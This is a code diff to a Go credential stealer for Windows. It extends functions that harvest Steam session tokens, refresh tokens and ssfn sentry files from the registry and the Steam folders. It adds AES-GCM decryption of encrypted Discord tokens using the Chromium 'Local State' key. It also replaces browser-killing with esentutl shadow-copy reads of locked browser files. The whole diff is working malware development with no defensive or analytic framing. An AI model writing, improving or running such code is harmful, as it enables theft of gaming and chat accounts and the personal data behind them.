@@ -500,17 +500,23 @@ func stealUserInfo() string {
 func stealSteamTokens() string {
 	var sb strings.Builder
 
-	var hKey syscall.Handle
-	keyPath, _ := syscall.UTF16PtrFromString("Software\\Valve\\Steam\\ConnectCache")
-	err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_READ, &hKey)
-	if err == nil {
-		defer syscall.RegCloseKey(hKey)
+	regKeys := []string{
+		"Software\\Valve\\Steam\\ConnectCache",
+		"Software\\Valve\\Steam",
+	}
+	for _, regPath := range regKeys {
+		var hKey syscall.Handle
+		keyPath, _ := syscall.UTF16PtrFromString(regPath)
+		err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_READ, &hKey)
+		if err != nil {
+			continue
+		}
 		advapi32 := syscall.NewLazyDLL("advapi32.dll")
 		regEnumValue := advapi32.NewProc("RegEnumValueW")
 		for idx := uint32(0); ; idx++ {
 			nameLen := uint32(256)
 			nameBuf := make([]uint16, nameLen)
-			dataLen := uint32(8192)
+			dataLen := uint32(16384)
 			dataBuf := make([]byte, dataLen)
 			var vtype uint32
 			r, _, _ := regEnumValue.Call(
@@ -532,10 +538,11 @@ func stealSteamTokens() string {
 				token = token[:len(token)-1]
 			}
 			token = strings.TrimSpace(token)
-			if len(token) > 50 && strings.Contains(token, ".") {
-				sb.WriteString(fmt.Sprintf("[%s] %s\n", name, token))
+			if len(token) > 20 {
+				sb.WriteString(fmt.Sprintf("[REG:%s/%s] %s\n", regPath, name, token))
 			}
 		}
+		syscall.RegCloseKey(hKey)
 	}
 
 	var steamPaths []string
@@ -563,6 +570,17 @@ func stealSteamTokens() string {
 
 	for _, steamDir := range steamPaths {
 		if _, err := os.Stat(steamDir); os.IsNotExist(err) { continue }
+
+		entries, _ := os.ReadDir(steamDir)
+		for _, e := range entries {
+			if !e.IsDir() && strings.HasPrefix(strings.ToLower(e.Name()), "ssfn") {
+				ssfnData, err := os.ReadFile(filepath.Join(steamDir, e.Name()))
+				if err == nil && len(ssfnData) > 0 {
+					sb.WriteString(fmt.Sprintf("[SSFN:%s] %s\n", e.Name(), base64.StdEncoding.EncodeToString(ssfnData)))
+				}
+			}
+		}
+
 		vdfFiles := []string{
 			filepath.Join(steamDir, "config", "config.vdf"),
 			filepath.Join(steamDir, "config", "loginusers.vdf"),
@@ -574,17 +592,25 @@ func stealSteamTokens() string {
 			content := string(data)
 			for _, line := range strings.Split(content, "\n") {
 				line = strings.TrimSpace(line)
-				if strings.Contains(line, ".eyA") || strings.Contains(line, ".eyJ") {
-					clean := strings.Trim(line, "\"\t\r ")
-					parts := strings.SplitN(clean, "\t", 2)
-					if len(parts) == 2 {
-						clean = strings.TrimSpace(parts[1])
-						clean = strings.Trim(clean, "\"")
+				lower := strings.ToLower(line)
+				isToken := strings.Contains(line, ".eyA") || strings.Contains(line, ".eyJ") ||
+					strings.Contains(lower, "refresh_token") || strings.Contains(lower, "access_token") ||
+					strings.Contains(lower, "webapitoken") || strings.Contains(lower, "steamloginsecure") ||
+					strings.Contains(lower, "account_name") || strings.Contains(lower, "personaname")
+				if !isToken {
+					continue
+				}
+				clean := strings.Trim(line, "\"\t\r ")
+				parts := strings.SplitN(clean, "\t", 2)
+				if len(parts) == 2 {
+					key := strings.Trim(strings.TrimSpace(parts[0]), "\"")
+					val := strings.Trim(strings.TrimSpace(parts[1]), "\"")
+					if len(val) > 0 {
+						sb.WriteString(fmt.Sprintf("[VDF:%s] %s\n", key, val))
 					}
-					if len(clean) > 50 {
-						sb.WriteString(clean)
-						sb.WriteString("\n")
-					}
+				} else if len(clean) > 20 {
+					sb.WriteString(clean)
+					sb.WriteString("\n")
 				}
 			}
 		}
@@ -599,16 +625,27 @@ func stealDiscordTokens() string {
 		return ""
 	}
 
-	var dirs []string
+	type searchEntry struct {
+		leveldbDir     string
+		localStatePath string
+	}
+
+	var searchDirs []searchEntry
 
 	discordApps := []string{
 		filepath.Join(appdata, "Discord"),
 		filepath.Join(appdata, "discordcanary"),
 		filepath.Join(appdata, "discordptb"),
 		filepath.Join(appdata, "Lightcord"),
+		filepath.Join(localAppdata, "Discord"),
+		filepath.Join(localAppdata, "discordcanary"),
+		filepath.Join(localAppdata, "discordptb"),
 	}
 	for _, app := range discordApps {
-		dirs = append(dirs, filepath.Join(app, "Local Storage", "leveldb"))
+		searchDirs = append(searchDirs, searchEntry{
+			leveldbDir:     filepath.Join(app, "Local Storage", "leveldb"),
+			localStatePath: filepath.Join(app, "Local State"),
+		})
 	}
 
 	browserBases := []string{
@@ -637,34 +674,100 @@ func stealDiscordTokens() string {
 		"Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"}
 	for _, base := range browserBases {
 		for _, prof := range profiles {
-			dirs = append(dirs, filepath.Join(base, prof, "Local Storage", "leveldb"))
+			searchDirs = append(searchDirs, searchEntry{
+				leveldbDir:     filepath.Join(base, prof, "Local Storage", "leveldb"),
+				localStatePath: filepath.Join(base, "Local State"),
+			})
 		}
 	}
 
 	tokenSet := map[string]bool{}
 	var tokens []string
 
-	for _, dir := range dirs {
-		entries, err := os.ReadDir(dir)
+	encPrefix := "dQw4w9WgXcQ:"
+
+	for _, entry := range searchDirs {
+		files, err := os.ReadDir(entry.leveldbDir)
 		if err != nil {
 			continue
 		}
-		for _, e := range entries {
-			ext := strings.ToLower(filepath.Ext(e.Name()))
+
+		var decKey []byte
+		if _, serr := os.Stat(entry.localStatePath); serr == nil {
+			decKey = getChromiumKey(entry.localStatePath)
+		}
+
+		for _, f := range files {
+			ext := strings.ToLower(filepath.Ext(f.Name()))
 			if ext != ".ldb" && ext != ".log" {
 				continue
 			}
-			data, err := os.ReadFile(filepath.Join(dir, e.Name()))
+			data, err := os.ReadFile(filepath.Join(entry.leveldbDir, f.Name()))
 			if err != nil {
 				continue
 			}
 			content := string(data)
+
 			for _, line := range strings.Split(content, "\n") {
-				for _, part := range strings.Split(line, "\"") {
-					part = strings.TrimSpace(part)
-					if len(part) == 0 {
+				searchLine := line
+				for {
+					idx := strings.Index(searchLine, encPrefix)
+					if idx == -1 {
+						break
+					}
+					after := searchLine[idx+len(encPrefix):]
+					searchLine = after
+
+					end := 0
+					for end < len(after) {
+						c := after[end]
+						if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=' {
+							end++
+						} else {
+							break
+						}
+					}
+					if end < 20 {
 						continue
 					}
+
+					b64 := after[:end]
+					raw, berr := base64.StdEncoding.DecodeString(b64)
+					if berr != nil {
+						continue
+					}
+
+					if decKey != nil && len(raw) > 15 {
+						var nonce, ciphertext []byte
+						if string(raw[:3]) == "v10" {
+							nonce = raw[3:15]
+							ciphertext = raw[15:]
+						} else {
+							nonce = raw[:12]
+							ciphertext = raw[12:]
+						}
+						block, err := aes.NewCipher(decKey)
+						if err != nil {
+							continue
+						}
+						gcm, err := cipher.NewGCM(block)
+						if err != nil {
+							continue
+						}
+						plain, err := gcm.Open(nil, nonce, ciphertext, nil)
+						if err != nil {
+							continue
+						}
+						token := string(plain)
+						if len(token) > 30 && !tokenSet[token] {
+							tokenSet[token] = true
+							tokens = append(tokens, token)
+						}
+					}
+				}
+
+				for _, part := range strings.Split(line, "\"") {
+					part = strings.TrimSpace(part)
 					if isDiscordToken(part) && !tokenSet[part] {
 						tokenSet[part] = true
 						tokens = append(tokens, part)
@@ -835,17 +938,22 @@ func dpapiDecrypt(data []byte) ([]byte, error) {
 	return result, nil
 }
 
-func killBrowserProcess(exeName string) {
-	if exeName == "" {
-		return
-	}
-	cmd := exec.Command("taskkill", "/F", "/IM", exeName)
+func copyFileVSS(src, dst string) error {
+	cmd := exec.Command("esentutl.exe", "/y", src, "/vss", "/d", dst)
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	_ = cmd.Run()
-	time.Sleep(500 * time.Millisecond)
+	if err := cmd.Run(); err != nil {
+		return err
+	}
+	info, err := os.Stat(dst)
+	if err != nil || info.Size() == 0 {
+		return fmt.Errorf("vss empty")
+	}
+	return nil
 }
 
 func copyFileLocked(src, dst, browserExe string) error {
+	_ = browserExe
+
 	data, err := os.ReadFile(src)
 	if err == nil && len(data) > 0 {
 		return os.WriteFile(dst, data, 0o644)
@@ -894,11 +1002,8 @@ func copyFileLocked(src, dst, browserExe string) error {
 		}
 	}
 
-	killBrowserProcess(browserExe)
-
-	data2, err2 := os.ReadFile(src)
-	if err2 == nil && len(data2) > 0 {
-		return os.WriteFile(dst, data2, 0o644)
+	if err := copyFileVSS(src, dst); err == nil {
+		return nil
 	}
 
 	return fmt.Errorf("locked %s", src)
